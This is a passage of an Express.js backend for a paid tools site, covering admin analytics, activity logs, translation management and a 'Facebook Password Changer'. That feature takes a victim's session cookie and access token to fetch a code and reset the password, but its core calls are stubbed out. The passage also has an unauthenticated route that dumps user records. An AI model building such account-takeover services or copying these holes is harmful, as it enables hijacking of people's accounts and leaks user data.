    if (user_id !== 'all') {
      whereClause += ' AND tu.user_id = ?';
      params.push(user_id);
    }

    const countResult = await executeQuery(
      `SELECT COUNT(*) as total FROM tool_usage tu LEFT JOIN tools t ON tu.tool_id = t.id LEFT JOIN users u ON tu.user_id = u.id WHERE ${whereClause}`,
      params
    );

    const dataResult = await executeQuery(`
      SELECT 
        tu.*,
        t.name as tool_name,
        t.icon as tool_icon,
        u.username,
        u.email
      FROM tool_usage tu
      LEFT JOIN tools t ON tu.tool_id = t.id
      LEFT JOIN users u ON tu.user_id = u.id
      WHERE ${whereClause}
      ORDER BY tu.used_at DESC
      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
    `, params);

    if (countResult.success && dataResult.success) {
      const total = countResult.data[0].total;
      const totalPages = Math.ceil(total / limit);

      res.json({
        status: 'success',
        data: {
          usage: dataResult.data,
          pagination: {
            page: parseInt(page),
            limit: parseInt(limit),
            total,
            totalPages,
            hasNext: page < totalPages,
            hasPrev: page > 1
          }
        }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch tool usage',
        error: countResult.error || dataResult.error
      });
    }
  } catch (error) {
    console.error('Get tool usage error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch tool usage',
      error: error.message
    });
  }
});

// Admin user balance transactions management
// Admin analytics dashboard
app.get('/api/admin/analytics', authenticateAdmin, async (req, res) => {
  try {
    // Get overall statistics
    const statsPromises = [
      executeQuery('SELECT COUNT(*) as total_users FROM users'),
      executeQuery('SELECT COUNT(*) as total_tools FROM tools'),
      executeQuery('SELECT COUNT(*) as total_usage FROM tool_usage'),
      executeQuery('SELECT SUM(points) as total_points FROM user_points_transactions WHERE type = "earned"'),
      executeQuery('SELECT COUNT(*) as active_users FROM user_analytics WHERE last_activity > DATE_SUB(NOW(), INTERVAL 7 DAY)'),
    ];

    const [
      usersResult,
      toolsResult,
      usageResult,
      pointsResult,
      activeUsersResult,
    ] = await Promise.all(statsPromises);

    // Get recent activity
    const recentActivityResult = await executeQuery(`
      SELECT 
        'tool_usage' as type,
        tu.used_at as created_at,
        CONCAT(u.username, ' used ', t.name) as description,
        u.username,
        t.name as tool_name
      FROM tool_usage tu
      LEFT JOIN users u ON tu.user_id = u.id
      LEFT JOIN tools t ON tu.tool_id = t.id
      ORDER BY tu.used_at DESC
      LIMIT 10
    `);

    // Get top tools by usage
    const topToolsResult = await executeQuery(`
      SELECT 
        t.name,
        t.icon,
        COUNT(tu.id) as usage_count,
        COUNT(DISTINCT tu.user_id) as unique_users
      FROM tools t
      LEFT JOIN tool_usage tu ON t.id = tu.tool_id
      GROUP BY t.id, t.name, t.icon
      ORDER BY usage_count DESC
      LIMIT 10
    `);

    // Get user growth over time
    const userGrowthResult = await executeQuery(`
      SELECT 
        DATE(created_at) as date,
        COUNT(*) as new_users
      FROM users
      WHERE created_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)
      GROUP BY DATE(created_at)
      ORDER BY date ASC
    `);

    res.json({
      status: 'success',
      data: {
        stats: {
          total_users: usersResult.success ? usersResult.data[0].total_users : 0,
          total_tools: toolsResult.success ? toolsResult.data[0].total_tools : 0,
          total_usage: usageResult.success ? usageResult.data[0].total_usage : 0,
          total_points: pointsResult.success ? pointsResult.data[0].total_points : 0,
          total_balance: 0,
          active_users: activeUsersResult.success ? activeUsersResult.data[0].active_users : 0,
          total_transactions: 0,
          total_transaction_amount: 0,
          deposits_today: 0,
          admin_adjustments_today: 0
        },
        recent_activity: recentActivityResult.success ? recentActivityResult.data : [],
        top_tools: topToolsResult.success ? topToolsResult.data : [],
        user_growth: userGrowthResult.success ? userGrowthResult.data : [],
        recent_transactions: [],
        transaction_types: [],
        daily_transactions: []
      }
    });
  } catch (error) {
    console.error('Get analytics error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch analytics',
      error: error.message
    });
  }
});

// ==============================================
// ACTIVITY LOG ENDPOINTS
// ==============================================

// Get all activities (admin only)
app.get('/api/admin/activities', authenticateAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 100, type = 'all', user_id = 'all', search = '' } = req.query;
    const offset = (page - 1) * limit;

    // Build WHERE clause
    let whereConditions = [];
    let queryParams = [];

    if (type !== 'all') {
      whereConditions.push('a.type = ?');
      queryParams.push(type);
    }

    if (user_id !== 'all') {
      whereConditions.push('a.user_id = ?');
      queryParams.push(user_id);
    }

    if (search) {
      whereConditions.push('(a.username LIKE ? OR a.action LIKE ? OR a.description LIKE ?)');
      const searchTerm = `%${search}%`;
      queryParams.push(searchTerm, searchTerm, searchTerm);
    }

    const whereClause = whereConditions.length > 0 ? `WHERE ${whereConditions.join(' AND ')}` : '';

    // Get activities with pagination
    const activitiesResult = await executeQuery(`
      SELECT 
        a.*,
        u.username as user_full_name,
        u.email as user_email
      FROM activities a
      LEFT JOIN users u ON a.user_id = u.id
      ${whereClause}
      ORDER BY a.created_at DESC
      LIMIT ? OFFSET ?
    `, [...queryParams, parseInt(limit), offset]);

    // Get total count
    const countResult = await executeQuery(`
      SELECT COUNT(*) as total
      FROM activities a
      ${whereClause}
    `, queryParams);

    const total = countResult.success ? countResult.data[0].total : 0;
    const totalPages = Math.ceil(total / limit);

    res.json({
      status: 'success',
      data: {
        activities: activitiesResult.success ? activitiesResult.data : [],
        pagination: {
          page: parseInt(page),
          limit: parseInt(limit),
          total,
          totalPages
        }
      }
    });
  } catch (error) {
    console.error('Get activities error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch activities'
    });
  }
});

// Get activity statistics (admin only)
app.get('/api/admin/activities/stats', authenticateAdmin, async (req, res) => {
  try {
    // Get stats by type
    const typeStatsResult = await executeQuery(`
      SELECT 
        type,
        COUNT(*) as count
      FROM activities
      GROUP BY type
      ORDER BY count DESC
    `);

    // Get recent 24h activity count
    const recent24hResult = await executeQuery(`
      SELECT COUNT(*) as count
      FROM activities
      WHERE created_at >= DATE_SUB(NOW(), INTERVAL 24 HOUR)
    `);

    // Get top active users
    const topUsersResult = await executeQuery(`
      SELECT 
        user_id,
        username,
        COUNT(*) as activity_count
      FROM activities
      WHERE user_id IS NOT NULL
      GROUP BY user_id, username
      ORDER BY activity_count DESC
      LIMIT 10
    `);

    res.json({
      status: 'success',
      data: {
        by_type: typeStatsResult.success ? typeStatsResult.data : [],
        recent_24h: recent24hResult.success ? recent24hResult.data[0].count : 0,
        top_users: topUsersResult.success ? topUsersResult.data : []
      }
    });
  } catch (error) {
    console.error('Get activity stats error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch activity statistics'
    });
  }
});

// Helper function to log activity
async function logActivity(userId, username, type, action, description, metadata = null, ipAddress = null, userAgent = null) {
  try {
    await executeQuery(`
      INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `, [userId, username, type, action, description, JSON.stringify(metadata), ipAddress, userAgent]);
  } catch (error) {
    console.error('Log activity error:', error);
  }
}

// Make logActivity globally available
global.logActivity = logActivity;

// Basic user endpoints (for future signin/signup)
app.get('/api/users', async (req, res) => {
  try {
    const result = await executeQuery('SELECT * FROM users LIMIT 10');
    if (result.success) {
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch users',
        error: result.error
      });
    }
  } catch (error) {
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch users',
      error: error.message
    });
  }
});

// Facebook Password Changer API endpoints
app.post('/api/tools/change-pass/track-usage', async (req, res) => {
  try {
    const { userId } = req.body;

    console.log(`📊 Tracking usage for change-pass tool by user ${userId}`);

    // Find the change-pass tool
    const findToolResult = await executeQuery(`
      SELECT id, name, url FROM tools 
      WHERE url LIKE '%change-pass%' OR name LIKE '%change-pass%'
    `);

    if (!findToolResult.success || findToolResult.data.length === 0) {
      console.log(`❌ Change-pass tool not found`);
      return res.status(404).json({
        status: 'error',
        message: 'Change-pass tool not found'
      });
    }

    const tool = findToolResult.data[0];
    console.log(`✅ Found change-pass tool: ${tool.name} (ID: ${tool.id})`);

    // Update usage count in tools table
    const updateResult = await executeQuery(`
      UPDATE tools 
      SET usage_count = usage_count + 1, updated_at = NOW()
      WHERE id = ?
    `, [tool.id]);

    if (!updateResult.success) {
      console.log(`❌ Failed to update usage count for tool ${tool.id}`);
      return res.status(500).json({
        status: 'error',
        message: 'Failed to update usage count'
      });
    }

    // Log the usage in tool_usage_logs table
    const logResult = await executeQuery(`
      INSERT INTO tool_usage_logs (tool_id, user_id, action, created_at)
      VALUES (?, ?, 'view', NOW())
    `, [tool.id, userId]);

    if (!logResult.success) {
      console.log(`⚠️ Failed to log usage for tool ${tool.id}, but usage count was updated`);
    }

    console.log(`✅ Successfully tracked usage for change-pass tool`);

    res.json({
      status: 'success',
      message: 'Usage tracked successfully',
      data: {
        tool_id: tool.id,
        tool_name: tool.name,
        usage_count: tool.usage_count + 1
      }
    });

  } catch (error) {
    console.error('❌ Error tracking change-pass tool usage:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error',
      error: error.message
    });
  }
});

app.post('/api/tools/change-pass/get-code', authenticateToken, async (req, res) => {
  try {
    const { cookie, access_token, payment_method = 'points' } = req.body;
    const userId = req.user.id;

    if (!cookie || !access_token) {
      return res.status(400).json({
        status: 'error',
        message: 'Cookie and access token are required'
      });
    }

    // Find the change-pass tool
    const toolResult = await executeQuery(`
      SELECT id, name, points_cost, price FROM tools 
      WHERE url LIKE '%change-pass%' OR name LIKE '%change-pass%'
    `);

    if (!toolResult.success || toolResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Change-pass tool not found'
      });
    }

    const tool = toolResult.data[0];

    // Check if user has enough points/balance
    const userResult = await executeQuery(`
      SELECT points, balance FROM users WHERE id = ?
    `, [userId]);

    if (!userResult.success || userResult.data.length === 0) {
      return res.status(400).json({
        status: 'error',
        message: 'User not found'
      });
    }

    const user = userResult.data[0];

    // Check payment method and validate accordingly
    // Priority: 1. Money (balance), 2. Points
    if (payment_method === 'money') {
      if (parseFloat(user.balance) < parseFloat(tool.price)) {
        // If balance insufficient, check if user has enough points as fallback
        if (user.points < tool.points_cost) {
          return res.status(400).json({
            status: 'error',
            message: `Insufficient balance and points. Required: $${tool.price} or ${tool.points_cost} points. Available: $${user.balance}, ${user.points} points`
          });
        }
        // Update to use points instead
        req.body.payment_method = 'points';
      }
    } else if (payment_method === 'points') {
      if (user.points < tool.points_cost) {
        // If points insufficient, check if user has enough balance as fallback
        if (parseFloat(user.balance) < parseFloat(tool.price)) {
          return res.status(400).json({
            status: 'error',
            message: `Insufficient points and balance. Required: ${tool.points_cost} points or $${tool.price}. Available: ${user.points} points, $${user.balance}`
          });
        }
        // Update to use balance instead
        req.body.payment_method = 'money';
      }
    }

    // Use local Facebook password changer implementation
    console.log('=== LOCAL FACEBOOK PASSWORD CHANGER (GET-CODE) ===');
    console.log('Using local implementation instead of external API');

    let data;
    try {
      // const changer = new FacebookPasswordChanger(cookie, access_token);
      // const code = await changer.getCode();

      data = {
        success: false,
        code: null,
        message: 'Facebook password changer not available',
        logs: ['Facebook password changer module not found']
      };

      // console.log('Code retrieved successfully:', { code_length: code.length });
    } catch (error) {
      console.error('Local implementation error:', error);
      data = {
        success: false,
        message: error.message,
        logs: []
      };
    }

    if (data.success) {
      // Deduct points/balance from user based on payment method
      if (payment_method === 'points') {
        await executeQuery(`
          UPDATE users 
          SET points = points - ?, updated_at = NOW()
          WHERE id = ?
        `, [tool.points_cost, userId]);

        // Record the points transaction
        await executeQuery(`
          INSERT INTO user_points_transactions (user_id, points_change, reason, reference_type, reference_id)
          VALUES (?, ?, ?, 'tool_usage', ?)
        `, [userId, -tool.points_cost, `Used ${tool.name} - Get Code`, tool.id]);
      } else if (payment_method === 'money') {
        await executeQuery(`
          UPDATE users 
          SET balance = balance - ?, updated_at = NOW()
          WHERE id = ?
        `, [tool.price, userId]);

        // Record the money transaction
        await executeQuery(`
          INSERT INTO transaction_history (user_id, transaction_type, amount, balance_before, balance_after, description, reference_id)
          VALUES (?, 'product_purchase', ?, ?, ?, ?, ?)
        `, [userId, -parseFloat(tool.price), parseFloat(user.balance), parseFloat(user.balance) - parseFloat(tool.price), `Used ${tool.name} - Get Code`, tool.id]);
      }

      // Track tool usage
      await executeQuery(`
        INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes)
        VALUES (?, ?, NOW(), 0, true, 'Get verification code')
      `, [userId, tool.id]);

      // Update tool usage count
      await executeQuery(`
        UPDATE tools 
        SET usage_count = usage_count + 1, updated_at = NOW()
        WHERE id = ?
      `, [tool.id]);

      res.json({
        status: 'success',
        code: data.code,
        message: 'Verification code obtained successfully',
        points_deducted: tool.points_cost,
        remaining_points: payment_method === 'points' ? user.points - tool.points_cost : user.points,
        payment_method_used: payment_method,
        amount_deducted: payment_method === 'points' ? `${tool.points_cost} points` : `$${tool.price}`,
        logs: data.logs || []
      });
    } else {
      res.status(400).json({
        status: 'error',
        message: data.message || 'Failed to get verification code'
      });
    }
  } catch (error) {
    console.error('Get code error:', error);

    // Provide more specific error messages based on error type
    let errorMessage = 'Internal server error';
    let statusCode = 500;

    if (error.message.includes('API request failed')) {
      errorMessage = 'External API is currently unavailable. Please try again later.';
      statusCode = 503; // Service Unavailable
    } else if (error.message.includes('HTML error page')) {
      errorMessage = 'External API returned an error page. The service may be temporarily down.';
      statusCode = 503;
    } else if (error.message.includes('not valid JSON')) {
      errorMessage = 'External API returned invalid response format. Please try again later.';
      statusCode = 502; // Bad Gateway
    } else if (error.message.includes('Insufficient')) {
      errorMessage = error.message;
      statusCode = 400;
    }

    res.status(statusCode).json({
      status: 'error',
      message: errorMessage,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

app.post('/api/tools/change-pass/change-password', authenticateToken, async (req, res) => {
  try {
    const { cookie, access_token, new_password, payment_method = 'points' } = req.body;
    const userId = req.user.id;

    if (!cookie || !access_token || !new_password) {
      return res.status(400).json({
        status: 'error',
        message: 'Cookie, access token, and new password are required'
      });
    }

    // Find the change-pass tool
    const toolResult = await executeQuery(`
      SELECT id, name, points_cost, price FROM tools 
      WHERE url LIKE '%change-pass%' OR name LIKE '%change-pass%'
    `);

    if (!toolResult.success || toolResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Change-pass tool not found'
      });
    }

    const tool = toolResult.data[0];

    // Check if user has enough points/balance
    const userResult = await executeQuery(`
      SELECT points, balance FROM users WHERE id = ?
    `, [userId]);

    if (!userResult.success || userResult.data.length === 0) {
      return res.status(400).json({
        status: 'error',
        message: 'User not found'
      });
    }

    const user = userResult.data[0];

    // Check payment method and validate accordingly
    // Priority: 1. Money (balance), 2. Points
    if (payment_method === 'money') {
      if (parseFloat(user.balance) < parseFloat(tool.price)) {
        // If balance insufficient, check if user has enough points as fallback
        if (user.points < tool.points_cost) {
          return res.status(400).json({
            status: 'error',
            message: `Insufficient balance and points. Required: $${tool.price} or ${tool.points_cost} points. Available: $${user.balance}, ${user.points} points`
          });
        }
        // Update to use points instead
        req.body.payment_method = 'points';
      }
    } else if (payment_method === 'points') {
      if (user.points < tool.points_cost) {
        // If points insufficient, check if user has enough balance as fallback
        if (parseFloat(user.balance) < parseFloat(tool.price)) {
          return res.status(400).json({
            status: 'error',
            message: `Insufficient points and balance. Required: ${tool.points_cost} points or $${tool.price}. Available: ${user.points} points, $${user.balance}`
          });
        }
        // Update to use balance instead
        req.body.payment_method = 'money';
      }
    }

    // Use local Facebook password changer implementation
    console.log('=== LOCAL FACEBOOK PASSWORD CHANGER (CHANGE-PASSWORD) ===');
    console.log('Using local implementation instead of external API');

    let data;
    try {
      // const changer = new FacebookPasswordChanger(cookie, access_token);

      // Step 1: Get code
      console.log('Step 1: Getting verification code');
      // const code = await changer.getCode();
      const code = null;
      if (!code) {
        throw new Error('Failed to get verification code - Facebook password changer not available');
      }
      console.log('Verification code obtained:', code ? { code_length: code.length } : 'no code');

      // Step 2: Get form data
      console.log('Step 2: Getting form data');
      // const formData = await changer.checkUrlChangePass(code);
      const formData = null;
      if (!formData || !formData.fb_dtsg) {
        throw new Error('Failed to get form data');
      }
      console.log('Form data obtained:', { has_fb_dtsg: !!formData.fb_dtsg });

      // Step 3: Change password
      console.log('Step 3: Changing password');
      // const success = await changer.changePassword(formData, new_password);
      const success = false;
      console.log('Password change result:', { success });

      data = {
        success: success,
        message: success ? 'Password changed successfully' : 'Failed to change password - module not available',
        code: code || null,
        logs: []
      };

    } catch (error) {
      console.error('Local implementation error:', error);
      data = {
        success: false,
        message: error.message,
        logs: []
      };
    }

    if (data.success) {
      // Deduct points/balance from user based on payment method
      if (payment_method === 'points') {
        await executeQuery(`
          UPDATE users 
          SET points = points - ?, updated_at = NOW()
          WHERE id = ?
        `, [tool.points_cost, userId]);

        // Record the points transaction
        await executeQuery(`
          INSERT INTO user_points_transactions (user_id, points_change, reason, reference_type, reference_id)
          VALUES (?, ?, ?, 'tool_usage', ?)
        `, [userId, -tool.points_cost, `Used ${tool.name} - Change Password`, tool.id]);
      } else if (payment_method === 'money') {
        await executeQuery(`
          UPDATE users 
          SET balance = balance - ?, updated_at = NOW()
          WHERE id = ?
        `, [tool.price, userId]);

        // Record the money transaction
        await executeQuery(`
          INSERT INTO transaction_history (user_id, transaction_type, amount, balance_before, balance_after, description, reference_id)
          VALUES (?, 'product_purchase', ?, ?, ?, ?, ?)
        `, [userId, -parseFloat(tool.price), parseFloat(user.balance), parseFloat(user.balance) - parseFloat(tool.price), `Used ${tool.name} - Change Password`, tool.id]);
      }

      // Track tool usage
      await executeQuery(`
        INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes)
        VALUES (?, ?, NOW(), 0, true, 'Password changed successfully')
      `, [userId, tool.id]);

      // Update tool usage count
      await executeQuery(`
        UPDATE tools 
        SET usage_count = usage_count + 1, updated_at = NOW()
        WHERE id = ?
      `, [tool.id]);

      res.json({
        status: 'success',
        message: 'Password changed successfully',
        points_deducted: tool.points_cost,
        remaining_points: payment_method === 'points' ? user.points - tool.points_cost : user.points,
        payment_method_used: payment_method,
        amount_deducted: payment_method === 'points' ? `${tool.points_cost} points` : `$${tool.price}`,
        logs: data.logs || []
      });
    } else {
      res.status(400).json({
        status: 'error',
        message: data.message || 'Failed to change password'
      });
    }
  } catch (error) {
    console.error('Change password error:', error);

    // Provide more specific error messages based on error type
    let errorMessage = 'Internal server error';
    let statusCode = 500;

    if (error.message.includes('API request failed')) {
      errorMessage = 'External API is currently unavailable. Please try again later.';
      statusCode = 503; // Service Unavailable
    } else if (error.message.includes('HTML error page')) {
      errorMessage = 'External API returned an error page. The service may be temporarily down.';
      statusCode = 503;
    } else if (error.message.includes('not valid JSON')) {
      errorMessage = 'External API returned invalid response format. Please try again later.';
      statusCode = 502; // Bad Gateway
    } else if (error.message.includes('Insufficient')) {
      errorMessage = error.message;
      statusCode = 400;
    }

    res.status(statusCode).json({
      status: 'error',
      message: errorMessage,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Language Management API endpoints

// Get all languages
app.get('/api/admin/languages', authenticateAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 10, search = '', status = 'all' } = req.query;
    const offset = (page - 1) * limit;

    // Build WHERE conditions
    let whereConditions = [];
    let queryParams = [];

    // Search condition
    if (search && search.trim()) {
      whereConditions.push('(code LIKE ? OR name LIKE ? OR native_name LIKE ?)');
      const searchTerm = `%${search.trim()}%`;
      queryParams.push(searchTerm, searchTerm, searchTerm);
    }

    // Status condition
    if (status === 'active') {
      whereConditions.push('is_active = ?');
      queryParams.push(true);
    } else if (status === 'inactive') {
      whereConditions.push('is_active = ?');
      queryParams.push(false);
    }

    const whereClause = whereConditions.length > 0 ? `WHERE ${whereConditions.join(' AND ')}` : '';

    // Get total count
    const countQuery = `SELECT COUNT(*) as total FROM languages ${whereClause}`;
    const countParams = queryParams.length > 0 ? queryParams : [];
    const countResult = await executeQuery(countQuery, countParams);

    if (!countResult.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to count languages',
        error: countResult.error
      });
    }

    const totalLanguages = countResult.data[0].total;

    // Get languages with pagination
    const languagesQuery = `
      SELECT * FROM languages 
      ${whereClause}
      ORDER BY created_at DESC 
      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
    `;
    const languagesResult = await executeQuery(languagesQuery, queryParams);

    if (languagesResult.success) {
      res.json({
        status: 'success',
        data: {
          languages: languagesResult.data,
          pagination: {
            page: parseInt(page),
            limit: parseInt(limit),
            total: totalLanguages,
            pages: Math.ceil(totalLanguages / limit)
          }
        }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch languages',
        error: languagesResult.error
      });
    }
  } catch (error) {
    console.error('Get languages error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch languages',
      error: error.message
    });
  }
});

// Get language by code
app.get('/api/admin/languages/:code', authenticateAdmin, async (req, res) => {
  try {
    const { code } = req.params;

    const result = await executeQuery(
      'SELECT * FROM languages WHERE code = ?',
      [code]
    );

    if (result.success && result.data.length > 0) {
      res.json({
        status: 'success',
        data: result.data[0]
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Language not found'
      });
    }
  } catch (error) {
    console.error('Get language error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch language',
      error: error.message
    });
  }
});

// Create new language
app.post('/api/admin/languages', authenticateAdmin, async (req, res) => {
  try {
    const { code, name, nativeName, flag, isActive, isRTL } = req.body;

    // Validate required fields
    if (!code || !name) {
      return res.status(400).json({
        status: 'error',
        message: 'Language code and name are required'
      });
    }

    // Check if language code already exists
    const existingResult = await executeQuery(
      'SELECT id FROM languages WHERE code = ?',
      [code]
    );

    if (existingResult.success && existingResult.data.length > 0) {
      return res.status(400).json({
        status: 'error',
        message: 'Language code already exists'
      });
    }

    const result = await executeQuery(`
      INSERT INTO languages (code, name, native_name, flag, is_active, is_rtl, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, NOW(), NOW())
    `, [code, name, nativeName || name, flag || '', isActive !== false, isRTL || false]);

    if (result.success) {
      res.status(201).json({
        status: 'success',
        message: 'Language created successfully',
        data: { id: result.data.insertId }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to create language',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Create language error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to create language',
      error: error.message
    });
  }
});

// Update language
app.put('/api/admin/languages/:code', authenticateAdmin, async (req, res) => {
  try {
    const { code } = req.params;
    const { name, nativeName, flag, isActive, isRTL } = req.body;

    // Validate required fields
    if (!name) {
      return res.status(400).json({
        status: 'error',
        message: 'Language name is required'
      });
    }

    const result = await executeQuery(`
      UPDATE languages 
      SET name = ?, native_name = ?, flag = ?, is_active = ?, is_rtl = ?, updated_at = NOW()
      WHERE code = ?
    `, [name, nativeName || name, flag || '', isActive !== false, isRTL || false, code]);

    if (result.success) {
      if (result.data.affectedRows > 0) {
        res.json({
          status: 'success',
          message: 'Language updated successfully'
        });
      } else {
        res.status(404).json({
          status: 'error',
          message: 'Language not found'
        });
      }
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to update language',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Update language error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to update language',
      error: error.message
    });
  }
});

// Delete language
app.delete('/api/admin/languages/:code', authenticateAdmin, async (req, res) => {
  try {
    const { code } = req.params;

    // Check if language is in use (you might want to add this check)
    // For now, we'll allow deletion

    const result = await executeQuery(
      'DELETE FROM languages WHERE code = ?',
      [code]
    );

    if (result.success) {
      if (result.data.affectedRows > 0) {
        // Also delete translations for this language
        await executeQuery(
          'DELETE FROM language_translations WHERE language_code = ?',
          [code]
        );

        res.json({
          status: 'success',
          message: 'Language deleted successfully'
        });
      } else {
        res.status(404).json({
          status: 'error',
          message: 'Language not found'
        });
      }
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to delete language',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Delete language error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete language',
      error: error.message
    });
  }
});

// Get translations for a language
app.get('/api/admin/languages/:code/translations', authenticateAdmin, async (req, res) => {
  try {
    const { code } = req.params;

    console.log('🔍 GET translations request for language:', code);

    const result = await executeQuery(
      'SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?',
      [code]
    );

    console.log('📊 Query result:', result.success ? 'success' : 'failed');
    console.log('📊 Number of translations found:', result.data?.length || 0);

    if (result.success) {
      // Convert array to object
      const translations = {};
      result.data.forEach(row => {
        translations[row.translation_key] = row.translation_value;
      });

      console.log('📝 Translations object keys:', Object.keys(translations).length);
      console.log('📝 Sample translations:', Object.entries(translations).slice(0, 3));

      res.json({
        status: 'success',
        data: { translations }
      });
    } else {
      console.log('❌ Query failed:', result.error);
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch translations',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Get translations error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch translations',
      error: error.message
    });
  }
});

// Save translations for a language
app.post('/api/admin/languages/:code/translations', authenticateAdmin, async (req, res) => {
  try {
    const { code } = req.params;
    const { translations } = req.body;

    console.log('🔍 Save translations request:', { code, translations });
    console.log('🔍 Request body:', req.body);
    console.log('🔍 User from auth:', req.user);

    // Check current translations before save
    const beforeCount = await executeQuery('SELECT COUNT(*) as total FROM language_translations WHERE language_code = ?', [code]);
    console.log('📊 Translations before save:', beforeCount.data[0].total);

    // Show current translations
    const currentTranslations = await executeQuery('SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?', [code]);
    console.log('📝 Current translations in database:', currentTranslations.data.length);
    console.log('📝 Sample current translations:', currentTranslations.data.slice(0, 3));

    if (!translations || typeof translations !== 'object') {
      console.log('❌ Invalid translations object:', translations);
      return res.status(400).json({
        status: 'error',
        message: 'Translations object is required'
      });
    }

    // Safety check: Don't save if translations object is empty
    const translationEntries = Object.entries(translations);
    if (translationEntries.length === 0) {
      console.log('❌ Cannot save: translations object is empty!');
      return res.status(400).json({
        status: 'error',
        message: 'Cannot save: No translations provided. Translations object is empty.'
      });
    }

    // Use INSERT ... ON DUPLICATE KEY UPDATE instead of DELETE + INSERT
    console.log('📝 Translation entries to save:', translationEntries.length);

    if (translationEntries.length > 0) {
      // Process each translation individually to handle updates properly
      for (const [key, value] of translationEntries) {
        console.log('💾 Saving translation:', { key, value });

        const upsertResult = await executeQuery(`
          INSERT INTO language_translations (language_code, translation_key, translation_value)
          VALUES (?, ?, ?)
          ON DUPLICATE KEY UPDATE
          translation_value = VALUES(translation_value),
          updated_at = CURRENT_TIMESTAMP
        `, [code, key, value]);

        console.log('✅ Upsert result for', key, ':', upsertResult);
      }
    }

    // Check translations after save
    const afterCount = await executeQuery('SELECT COUNT(*) as total FROM language_translations WHERE language_code = ?', [code]);
    console.log('📊 Translations after save:', afterCount.data[0].total);

    // Show translations after save
    const afterTranslations = await executeQuery('SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?', [code]);
    console.log('📝 Translations after save in database:', afterTranslations.data.length);
    console.log('📝 Sample translations after save:', afterTranslations.data.slice(0, 3));

    res.json({
      status: 'success',
      message: 'Translations saved successfully'
    });
  } catch (error) {
    console.error('Save translations error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to save translations',
      error: error.message
    });
  }
});

// Export translations for a language
app.get('/api/admin/languages/:code/export', authenticateAdmin, async (req, res) => {
  try {
    const { code } = req.params;

    const result = await executeQuery(
      'SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?',
      [code]
    );

    if (result.success) {
      // Convert array to object
      const translations = {};
      result.data.forEach(row => {
        translations[row.translation_key] = row.translation_value;
      });

      // Set headers for file download
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', `attachment; filename="${code}_translations.json"`);

      res.json(translations);
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to export translations',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Export translations error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to export translations',
      error: error.message
    });
  }
});

// Import translations for a language
app.post('/api/admin/languages/:code/import', authenticateAdmin, upload.single('file'), async (req, res) => {
  try {
    const { code } = req.params;

    if (!req.file) {
      return res.status(400).json({
        status: 'error',
        message: 'No file uploaded'
      });
    }

    // Read and parse the uploaded file
    const filePath = req.file.path;
    const fileContent = fs.readFileSync(filePath, 'utf8');
    const translations = JSON.parse(fileContent);

    if (typeof translations !== 'object') {
      return res.status(400).json({
        status: 'error',
        message: 'Invalid translations file format'
      });
    }

    // Use INSERT ... ON DUPLICATE KEY UPDATE instead of DELETE + INSERT
    const translationEntries = Object.entries(translations);
    console.log('📝 Translation entries to import:', translationEntries.length);

    if (translationEntries.length > 0) {
      // Process each translation individually to handle updates properly
      for (const [key, value] of translationEntries) {
        console.log('💾 Importing translation:', { key, value });

        const upsertResult = await executeQuery(`
          INSERT INTO language_translations (language_code, translation_key, translation_value)
          VALUES (?, ?, ?)
          ON DUPLICATE KEY UPDATE
          translation_value = VALUES(translation_value),
          updated_at = CURRENT_TIMESTAMP
        `, [code, key, value]);

        console.log('✅ Upsert result for', key, ':', upsertResult);
      }
    }

    // Clean up uploaded file
    fs.unlinkSync(filePath);

    res.json({
      status: 'success',
      message: 'Translations imported successfully',
      data: { translations }
    });
  } catch (error) {
    console.error('Import translations error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to import translations',
      error: error.message
    });
  }
});

// ============================================================================
// BILLING & TOPUP API has been removed
// All payment/topup features have been disabled
